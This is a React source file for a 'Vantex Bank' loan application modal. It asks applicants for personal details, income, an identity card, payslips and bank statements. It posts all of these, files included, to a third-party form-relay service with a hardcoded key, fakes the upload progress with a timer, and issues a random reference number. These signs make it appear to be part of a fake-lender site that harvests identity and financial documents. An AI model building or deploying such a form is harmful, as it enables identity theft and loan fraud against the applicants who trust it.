'use client';

import { useEffect, useRef, useState } from 'react';
import { useAppState } from './AppState';
import { fmt } from '@/lib/loan';

type Step = 1 | 2 | 3 | 4;

export default function AppModal() {
  const { activeModal, closeModal, amount, months, loan, locale, t, setAmount, setMonths } = useAppState();
  const isOpen = activeModal === 'app';

  const [step, setStep] = useState<Step>(1);
  const [transitioning, setTransitioning] = useState(false);
  const [uploaded, setUploaded] = useState<Record<string, boolean>>({});
  const [uploading, setUploading] = useState<Record<string, boolean>>({});
  const [files, setFiles] = useState<Record<string, File | null>>({});
  const fileInputRefs = useRef<Record<string, HTMLInputElement | null>>({});

  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    birthDate: '',
    nationality: t('app.nationality'),
    address: '',
    job: '',
    income: '',
    purpose: t('purposes.work')
  });

  const [checks, setChecks] = useState({ chk1: false, chk2: false, chk3: false });
  const [submitting, setSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<string[]>([]);
  const [showCustomAlert, setShowCustomAlert] = useState(false);
  const refCode = useRef('VTX-2026-0000');
  const boxRef = useRef<HTMLDivElement>(null);

  const DOCS = [
    { key: 'id', label: t('app.upload_cni'), sub: t('app.upload_cni_sub') },
    { key: 'payslips', label: t('app.upload_pay'), sub: t('app.upload_pay_sub') },
    { key: 'statements', label: t('app.upload_bank'), sub: t('app.upload_bank_sub') },
  ] as const;

  useEffect(() => {
    if (isOpen) {
      setStep(1);
      setUploaded({});
      setFiles({});
      setChecks({ chk1: false, chk2: false, chk3: false });
      setSubmitting(false);
      setShowSuccess(false);
      setErrorMsg(null);
      setFieldErrors([]);
      setShowCustomAlert(false);
    }
  }, [isOpen]);

  function handleInputChange(e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    setFieldErrors(prev => prev.filter(f => f !== name));
  }

  function handleFileChange(key: string, e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 8 * 1024 * 1024) {
      setErrorMsg(t('errors.file_too_large'));
      setShowCustomAlert(true);
      return;
    }
    setUploading((prev) => ({ ...prev, [key]: true }));
    setUploaded((prev) => ({ ...prev, [key]: false }));
    setFieldErrors(prev => prev.filter(f => f !== key));

    setTimeout(() => {
      setUploading((prev) => ({ ...prev, [key]: false }));
      setUploaded((prev) => ({ ...prev, [key]: true }));
      setFiles(prev => ({ ...prev, [key]: file }));
    }, 1200);
  }

  function triggerUpload(key: string) {
    fileInputRefs.current[key]?.click();
  }

  function validateStep(currentStep: Step): boolean {
    const errors: string[] = [];
    if (currentStep === 1) {
      if (!formData.job) errors.push('job');
      if (!formData.income) errors.push('income');
      if (amount <= 0) errors.push('amount');
      if (errors.length > 0) {
        setFieldErrors(errors);
        setErrorMsg(t('errors.fill_project'));
        setShowCustomAlert(true);
        return false;
      }
    } else if (currentStep === 2) {
      if (!formData.firstName) errors.push('firstName');
      if (!formData.lastName) errors.push('lastName');
      if (!formData.email) errors.push('email');
      if (!formData.phone) errors.push('phone');
      if (!formData.birthDate) errors.push('birthDate');
      if (!formData.address) errors.push('address');

      if (errors.length > 0) {
        setFieldErrors(errors);
        setErrorMsg(t('errors.fill_infos'));
        setShowCustomAlert(true);
        return false;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(formData.email)) {
        setFieldErrors(['email']);
        setErrorMsg(t('errors.invalid_email'));
        setShowCustomAlert(true);
        return false;
      }

      const birthDate = new Date(formData.birthDate);
      const today = new Date();
      let age = today.getFullYear() - birthDate.getFullYear();
      const m = today.getMonth() - birthDate.getMonth();
      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
      if (age < 18) {
        setFieldErrors(['birthDate']);
        setErrorMsg(t('errors.min_age'));
        setShowCustomAlert(true);
        return false;
      }
    } else if (currentStep === 3) {
      if (!uploaded.id) errors.push('id');
      if (!uploaded.payslips) errors.push('payslips');
      if (!uploaded.statements) errors.push('statements');
      if (errors.length > 0) {
        setFieldErrors(errors);
        setErrorMsg(t('errors.upload_all'));
        setShowCustomAlert(true);
        return false;
      }
    }
    return true;
  }

  function goToStep(target: Step) {
    if (target > step && !validateStep(step)) return;
    if (target <= step) {
      setStep(target);
      boxRef.current?.scrollTo({ top: 0 });
      return;
    }
    setTransitioning(true);
    setTimeout(() => {
      setTransitioning(false);
      setStep(target);
      boxRef.current?.scrollTo({ top: 0 });
    }, 600);
  }

  async function submitApplication() {
    if (!checks.chk1 || !checks.chk2 || !checks.chk3) {
      setErrorMsg(t('app.alert_checks'));
      setShowCustomAlert(true);
      return;
    }
    setSubmitting(true);
    try {
      const submissionData = new FormData();
      submissionData.append('access_key', 'rdl767g9fmt');
      submissionData.append('subject', `${t('app.email_subject')} - ${formData.lastName} ${formData.firstName}`);
      submissionData.append('from_name', 'Vantex Bank - Client');
      submissionData.append('email', formData.email);
      submissionData.append('Nom', formData.lastName);
      submissionData.append('Prénom', formData.firstName);
      submissionData.append('Téléphone', formData.phone);
      submissionData.append('Date de naissance', formData.birthDate);
      submissionData.append('Pays', formData.nationality);
      submissionData.append('Adresse', formData.address);
      submissionData.append('Montant', `${amount} €`);
      submissionData.append('Durée', `${months} mois`);
      submissionData.append('Profession', formData.job);
      submissionData.append('Revenu mensuel', `${formData.income} €`);
      submissionData.append('Objet', formData.purpose);
      if (files.id) submissionData.append('Fichier_ID', files.id);
      if (files.payslips) submissionData.append('Fichier_Salaire', files.payslips);
      if (files.statements) submissionData.append('Fichier_Banque', files.statements);

      const response = await fetch('https://forminit.com/f/rdl767g9fmt', {
        method: 'POST',
        headers: { 'Accept': 'application/json' },
        body: submissionData
      });

      if (response.ok) {
        refCode.current = 'VTX-2026-' + Math.floor(Math.random() * 9000 + 1000);
        setShowSuccess(true);
      } else {
        const errorData = await response.json();
        throw new Error(errorData.message || "Error");
      }
    } catch (error: any) {
      setErrorMsg(`${t('errors.send_error')} ${error.message}`);
      setShowCustomAlert(true);
    } finally {
      setSubmitting(false);
    }
  }

  const stepLabels = [
    { id: 1, label: t('app.step1') },
    { id: 2, label: t('app.step_infos') },
    { id: 3, label: t('app.step2') },
    { id: 4, label: t('app.step4') },
  ];

  const hasErr = (name: string) => fieldErrors.includes(name) ? 'field-error' : '';

  return (
    <div className={`modal-overlay ${isOpen ? 'open' : ''}`} onClick={(e) => e.target === e.currentTarget && closeModal()}>

      {showCustomAlert && (
        <div className="custom-alert-overlay" onClick={() => setShowCustomAlert(false)}>
          <div className="custom-alert-box" onClick={e => e.stopPropagation()}>
            <div className="alert-icon">⚠️</div>
            <p className="alert-text">{errorMsg}</p>
            <button className="btn-full" onClick={() => setShowCustomAlert(false)}>{t('errors.ok_btn')}</button>
          </div>
        </div>
      )}

      <div className="modal-box app-modal-box" ref={boxRef}>
        <button className="modal-close" onClick={closeModal}>
          <svg viewBox="0 0 24 24" fill="none" stroke="#0B1D3A" strokeWidth={2.5} width={20} height={20}>
            <line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" />
          </svg>
        </button>
        <div className="modal-inner">
          <div className="modal-logo">
            <div className="modal-logo-icon">V</div>
            <span className="modal-logo-name">{t('app.title')}</span>
          </div>

          {!showSuccess && (
            <div className="app-progress">
              {stepLabels.map((s) => (
                <div key={s.id} className={`prog-step ${step === s.id ? 'active' : ''} ${step > s.id ? 'done' : ''}`}>
                  <div className="prog-dot">{s.id}</div>
                  <div className="prog-lbl">{s.label}</div>
                </div>
              ))}
            </div>
          )}

          {transitioning || (submitting && !showSuccess) ? (
            <div className="loading-wrap">
              <div className="spinner"></div>
              <div className="loading-txt">{submitting ? t('app.sending') : t('app.loading')}</div>
            </div>
          ) : showSuccess ? (
            <div className="success-panel">
               <div className="success-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth={3}><polyline points="20 6 9 17 4 12" /></svg></div>
               <h2 className="success-title">{t('app.success_title')}</h2>
               <p className="success-txt">{t('app.success_desc')}</p>
               <div className="success-ref"><div><div className="ref-lbl">{t('app.ref_label')}</div><div className="ref-code">{refCode.current}</div></div></div>
               <button className="btn-full" onClick={closeModal}>{t('app.home_btn')}</button>
            </div>
          ) : (
            <>
              {step === 1 && (
                <div className="step-panel active">
                  <div className="form-group">
                    <label className="form-label">{t('sim.amount_label')}</label>
                    <div style={{ position: 'relative' }}>
                      <input type="number" className={`form-input ${hasErr('amount')}`} value={amount} onChange={(e) => setAmount(+e.target.value)} />
                      <span style={{ position: 'absolute', right: '20px', top: '50%', transform: 'translateY(-50%)', fontWeight: '700' }}>€</span>
                    </div>
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('sim.duration_label')}</label>
                    <select className="form-select" value={months} onChange={(e) => setMonths(+e.target.value)}>
                      {[12, 24, 36, 48, 60, 72, 84, 96, 108, 120].map(m => <option key={m} value={m}>{m} {t('common.months')}</option>)}
                    </select>
                  </div>
                  <div className="sum-box" style={{ background: 'var(--navy)', color: '#fff', padding: '24px', borderRadius: '14px', marginBottom: '32px' }}>
                    <div className="sum-row" style={{ border: 'none', padding: '0', justifyContent: 'space-between', display: 'flex', alignItems: 'center' }}>
                      <span style={{ fontSize: '15px', opacity: 0.8 }}>{t('sim.res_monthly')}</span>
                      <span style={{ color: 'var(--gold)', fontWeight: '700', fontSize: '24px' }}>{fmt(loan.monthly, locale)} {t('common.per_month')}</span>
                    </div>
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('app.job')}</label>
                    <select className={`form-select ${hasErr('job')}`} name="job" value={formData.job} onChange={handleInputChange}>
                      <option value="">{t('auth.select')}</option>
                      <option>{t('jobs.cdi')}</option><option>{t('jobs.cdd')}</option><option>{t('jobs.gov')}</option><option>{t('jobs.freelance')}</option><option>{t('jobs.boss')}</option><option>{t('jobs.retired')}</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('app.income')}</label>
                    <input type="number" name="income" className={`form-input ${hasErr('income')}`} placeholder="2500" value={formData.income} onChange={handleInputChange} />
                  </div>
                  <button className="btn-full" style={{ padding: '18px', fontSize: '16px' }} onClick={() => goToStep(2)}>{t('common.continue')} →</button>
                </div>
              )}

              {step === 2 && (
                <div className="step-panel active">
                  <div className="form-group">
                    <label className="form-label">{t('auth.firstname')}</label>
                    <input type="text" name="firstName" className={`form-input ${hasErr('firstName')}`} placeholder={t('contact_page.firstname_placeholder')} value={formData.firstName} onChange={handleInputChange} />
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('auth.lastname')}</label>
                    <input type="text" name="lastName" className={`form-input ${hasErr('lastName')}`} placeholder={t('contact_page.lastname_placeholder')} value={formData.lastName} onChange={handleInputChange} />
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('auth.email_label')}</label>
                    <input type="email" name="email" className={`form-input ${hasErr('email')}`} placeholder={t('auth.email_placeholder')} value={formData.email} onChange={handleInputChange} />
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('app.phone')}</label>
                    <input type="tel" name="phone" className={`form-input ${hasErr('phone')}`} placeholder={t('common.phone_val')} value={formData.phone} onChange={handleInputChange} />
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('auth.birthdate')}</label>
                    <input type="date" name="birthDate" className={`form-input ${hasErr('birthDate')}`} value={formData.birthDate} onChange={handleInputChange} />
                  </div>
                  <div className="form-group">
                    <label className="form-label">{t('app.address')}</label>
                    <input type="text" name="address" className={`form-input ${hasErr('address')}`} placeholder={t('contact_page.office')} value={formData.address} onChange={handleInputChange} />
                  </div>
                  <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(1)}>← {t('common.back')}</button><button className="btn-full" onClick={() => goToStep(3)}>{t('common.continue')} →</button></div>
                </div>
              )}

              {step === 3 && (
                <div className="step-panel active">
                  <h2 className="sp-title">{t('app.docs_title')}</h2>
                  <p className="sp-sub">{t('app.docs_desc')}</p>
                  {DOCS.map((doc) => (
                    <div className={`upload-zone ${uploading[doc.key] ? 'uploading' : ''} ${hasErr(doc.key)}`} key={doc.key} onClick={() => !uploading[doc.key] && triggerUpload(doc.key)}>
                      <input type="file" style={{ display: 'none' }} ref={(el) => { fileInputRefs.current[doc.key] = el; }} onChange={(e) => handleFileChange(doc.key, e)} accept=".pdf,.jpg,.jpeg,.png" />
                      {uploading[doc.key] ? <div className="spinner" style={{ width: '24px', height: '24px' }}></div> : uploaded[doc.key] ? <div style={{ color: 'var(--success)', fontWeight: '700' }}>✓ {t('app.upload_done')}</div> : <div><div className="upload-lbl">{doc.label}</div><div className="upload-sublbl">{doc.sub}</div></div>}
                    </div>
                  ))}
                  <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(2)}>← {t('common.back')}</button><button className="btn-full" onClick={() => goToStep(4)}>{t('common.continue')} →</button></div>
                </div>
              )}

              {step === 4 && (
                <div className="step-panel active">
                  <h2 className="sp-title">{t('app.recap_title')}</h2>
                  <div className="sum-box" style={{ background: '#F8FAFC', border: '1px solid var(--border)', padding: '24px', borderRadius: '14px', marginBottom: '24px' }}>
                    <div className="sum-row" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px', paddingBottom: '12px', borderBottom: '1px solid #E2E8F0' }}>
                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_loan')}</span>
                      <strong style={{ color: 'var(--navy)', fontSize: '15px' }}>{amount.toLocaleString()} € / {months} {t('common.months')}</strong>
                    </div>
                    <div className="sum-row" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px', paddingBottom: '12px', borderBottom: '1px solid #E2E8F0' }}>
                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_monthly')}</span>
                      <strong style={{ color: 'var(--blue)', fontSize: '16px' }}>{fmt(loan.monthly, locale)}</strong>
                    </div>
                    <div className="sum-row" style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_email')}</span>
                      <strong style={{ color: 'var(--navy)', fontSize: '14px', wordBreak: 'break-all' }}>{formData.email}</strong>
                    </div>
                  </div>
                  <div className="check-group"><input type="checkbox" id="c1" checked={checks.chk1} onChange={e => setChecks(p => ({ ...p, chk1: e.target.checked }))}/><label htmlFor="c1" className="check-lbl">{t('app.chk1')}</label></div>
                  <div className="check-group"><input type="checkbox" id="c2" checked={checks.chk2} onChange={e => setChecks(p => ({ ...p, chk2: e.target.checked }))}/><label htmlFor="c2" className="check-lbl">{t('app.chk2')}</label></div>
                  <div className="check-group"><input type="checkbox" id="c3" checked={checks.chk3} onChange={e => setChecks(p => ({ ...p, chk3: e.target.checked }))}/><label htmlFor="c3" className="check-lbl">{t('app.chk3')}</label></div>
                  <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(3)}>← {t('common.back')}</button><button className="btn-full" onClick={submitApplication}>{t('app.submit_btn')}</button></div>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}
